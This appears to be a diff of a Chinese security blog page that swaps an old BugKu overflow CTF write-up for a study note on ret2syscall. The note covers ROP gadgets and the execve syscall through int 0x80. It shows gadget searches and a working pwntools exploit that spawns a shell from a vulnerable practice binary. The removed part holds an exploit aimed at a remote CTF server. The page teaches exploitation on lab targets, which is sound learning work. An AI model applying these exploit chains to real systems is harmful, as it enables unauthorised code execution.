@@ -157,7 +157,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                [BugKu]overflowPWN
+                                [PWN]ret2syscall 学习笔记
                             </h1>
                             
                                 <!--en-->
@@ -167,15 +167,17 @@
                                         「配枪朱丽叶 - 分部。」
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2021-06-28</a>
+                                Date: <a href="#">2021-07-15</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">0.8
+                                    href="#">4.8
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">151</a></span>
+                                    <span class="post-words">words:<a href="#">1008</a></span>
                                     
                                         <span class="post-category">
                                 Category:
+                                
+                                <a href="https://shawr00t.github.io/XtLkpctuU/">学习笔记</a>
                                 
                                 <a href="https://shawr00t.github.io/HdcmhNKsB/">pwn</a>
                                 
@@ -186,36 +188,118 @@
                         </header>
                         
                         <div class="post-content">
-                            <p>checksec看了下，四个保护都没有开。<br>
-main中代码如下：</p>
+                            <p>ret2syscall 即控制程序执行系统调用来获取 shell。</p>
+<ul>
+<li>rop：在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</li>
+<li>gadgets：在程序中的指令片段，有时为了达到执行命令的目的，需要多个gadget来完成功能。gadget最后一般都有ret，因为需要将程序控制权(EIP)给下一个gadget。即让程序自动持续的选择堆栈中的指令依次执行。</li>
+<li>ropgadgets：一个pwntools的一个命令行工具，用来具体寻找gadgets的。例如：从pop、ret序列当中寻找其中的eax：<code>ROPgadget --binary ./example --only “pop|ret” | grep “eax”</code></li>
+<li>在linux系统中，函数的调用是有一个系统调用号的。Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数。简单来讲，通过系统调用来获取 shell 就需要把系统调用的参数放入各个寄存器，然后执行 int 0x80 就可以了。：</li>
+</ul>
+<blockquote>
+<blockquote>
+<p>应用程序调用系统调用的过程是：<br>
+1、把系统调用的编号存入 EAX<br>
+2、把函数参数存入其它通用寄存器<br>
+3、触发 0x80 号中断（int 0x80）</p>
+</blockquote>
+</blockquote>
+<ul>
+<li>系统调用号系统调用号有32位与64位的区分，Ubuntu环境下系统调用号的位置：<code>/usr/include/x86_64-linux-gnu/asm</code>。</li>
+</ul>
+<blockquote>
+<p>unistd_32.h<br>
+unistd_64.h</p>
+</blockquote>
+<p><code>execve(“/bin/sh”,null,null)</code>函数其32位系统调用号是11，即十六进制0xb。<br>
+系统调用号，即 eax 应该为 0xb。<br>
+第一个参数，即 ebx 应该指向 /bin/sh 的地址（其实执行 sh 的地址也可以）。<br>
+第二个参数，即 ecx 应该为 0。<br>
+第三个参数，即 edx 应该为 0。<br>
+系统在运行的时候会使用上面四个寄存器，所以那么上面内容可以写为：int 0×80(eax,ebx,ecx,edx)。<br>
+只需要让栈顶的值是0xb，然后通过pop eax达到目的（把栈顶的值返回到寄存器eax中）。</p>
+<p>例题：<a href="https://pan.baidu.com/s/1fbeBjaoX-rmW_BZRT7lxbg">戳我</a><br>
+checksec:</p>
+<pre><code>Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x8048000)
+</code></pre>
+<p>main函数很明显的栈溢出：</p>
 <pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
 {
-  char s; // [rsp+0h] [rbp-30h]
+  int v4; // [esp+1Ch] [ebp-64h]
 
-  memset(&amp;s, 0, 0x30uLL);
-  setvbuf(stdout, 0LL, 2, 0LL);
-  setvbuf(stdin, 0LL, 1, 0LL);
-  puts(&quot;say something?&quot;);
-  read(0, &amp;s, 0x100uLL);
-  puts(&quot;oh,that's so boring!&quot;);
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;);
+  puts(&quot;What do you plan to do?&quot;);
+  gets(&amp;v4);
   return 0;
 }
 </code></pre>
-<p>还看到了直接获取flag的get_shell_函数，地址是0x400751：</p>
-<pre><code class="language-c">int get_shell_()
-{
-  puts(&quot;tql~tql~tql~tql~tql~tql~tql&quot;);
-  puts(&quot;this is your flag!&quot;);
-  return system(&quot;cat flag&quot;);
-}
+<p>使用cyclic工具可计算得到偏移量为112：<br>
+<img src="https://imgpp.com/images/2021/07/15/2021-07-15_140240.png" alt="2021-07-15_140240.png" loading="lazy"><br>
+使用ROPgadget工具找到pop eax：<br>
+<code>ROPgadget --binary ./Desktop/rop --only &quot;pop|ret&quot; |grep &quot;eax&quot;</code><br>
+得到可利用的地址为0x080bb196：</p>
+<pre><code>0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
+0x080bb196 : pop eax ; ret
+0x0807217a : pop eax ; ret 0x80e
+0x0804f704 : pop eax ; ret 3
+0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
 </code></pre>
-<p>可以利用read函数溢出让返回地址为0x400751，exp如下：</p>
+<p>继续找pop ebx，得到可用的地址为0x0806eb90：</p>
+<pre><code>0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
+0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
+0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
+0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
+0x080be23f : pop ebx ; pop edi ; ret
+0x0806eb69 : pop ebx ; pop edx ; ret
+0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
+0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
+0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
+0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
+0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
+0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
+0x08048913 : pop ebx ; pop esi ; pop edi ; ret
+0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
+0x08049a94 : pop ebx ; pop esi ; ret
+0x080481c9 : pop ebx ; ret
+0x080d7d3c : pop ebx ; ret 0x6f9
+0x08099c87 : pop ebx ; ret 8
+0x0806eb91 : pop ecx ; pop ebx ; ret
+0x0806336b : pop edi ; pop esi ; pop ebx ; ret
+0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
+0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
+0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
+0x0805c820 : pop esi ; pop ebx ; ret
+0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x0807b6ed : pop ss ; pop ebx ; ret
+</code></pre>
+<p>再找一下&quot;/bin/sh&quot;字符串的位置：<br>
+<code>ROPgadget --binary ./Desktop/rop --string &quot;/bin/sh&quot;</code></p>
+<pre><code>Strings information
+============================================================
+0x080be408 : /bin/sh
+</code></pre>
+<p>再找一下&quot;int 80&quot;的位置：<br>
+<code>ROPgadget --binary ./Desktop/rop --only &quot;int&quot;</code></p>
+<pre><code>Gadgets information
+============================================================
+0x08049421 : int 0x80
+</code></pre>
 <pre><code class="language-python">from pwn import *
 
-p = remote('114.67.246.176',16081)
-payload = 'a'*0x30+'a'*0x8+p64(0x400751)
-p.sendline(payload)
-p.interactive()
+io = process('./rop')
+pop_eax_ret = 0x080bb196
+pop_other_ret = 0x0806eb90
+binsh = 0x080be408
+int80h = 0x08049421
+payload = 'a'*112+p32(pop_eax_ret)+p32(0xb)+p32(pop_other_ret)+p32(0)+p32(0)+p32(binsh)+p32(int80h)
+io.sendline(payload)
+io.interactive()
 </code></pre>
 
                         </div>
@@ -231,7 +315,7 @@ p.interactive()
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://shawr00t.github.io/bugkuoverflowpwn/">https://shawr00t.github.io/bugkuoverflowpwn/</a></span>
+                                                <span><a href="https://shawr00t.github.io/pwnret2syscall-xue-xi-bi-ji/">https://shawr00t.github.io/pwnret2syscall-xue-xi-bi-ji/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -246,9 +330,9 @@ p.interactive()
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/bugkuoverflowpwn/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/bugkuoverflowpwn/&sharesource=qzone&title=[BugKu]overflowPWN&pics=https://shawr00t.github.io/images/avatar.png?v=1626333275922&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/bugkuoverflowpwn/&sharesource=weibo&title=[BugKu]overflowPWN + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1626333275922 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/pwnret2syscall-xue-xi-bi-ji/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/pwnret2syscall-xue-xi-bi-ji/&sharesource=qzone&title=[PWN]ret2syscall 学习笔记&pics=https://shawr00t.github.io/images/avatar.png?v=1626333275922&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/pwnret2syscall-xue-xi-bi-ji/&sharesource=weibo&title=[PWN]ret2syscall 学习笔记 + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1626333275922 "><i class="fa fa-weibo "></i></a>
                                                         
                                                             <div class="reward ">
                                                                 <div class="reward-button ">&yen;
@@ -266,6 +350,10 @@ p.interactive()
                                                                         <span class="tag ">
                         
                         
+                        <a href="https://shawr00t.github.io/XtLkpctuU/">#
+                                                学习笔记
+                                                    </a>
+                                                    
                         <a href="https://shawr00t.github.io/HdcmhNKsB/">#
                                                 pwn
                                                     </a>
@@ -283,13 +371,9 @@ p.interactive()
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://shawr00t.github.io/pwnablekrfd/">
-                                                                                            [pwnable.kr]fd
-                                                                                        </a>
-                                                                                        
                                                                                             
-                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/">
-                                                                                                    [攻防世界]PWN-level0
+                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/buuctfciscn_2019_n_1/">
+                                                                                                    [BUUCTF]ciscn_2019_n_1 
                                                                                                 </a>
                                                                                                 
                                                                                 </section>
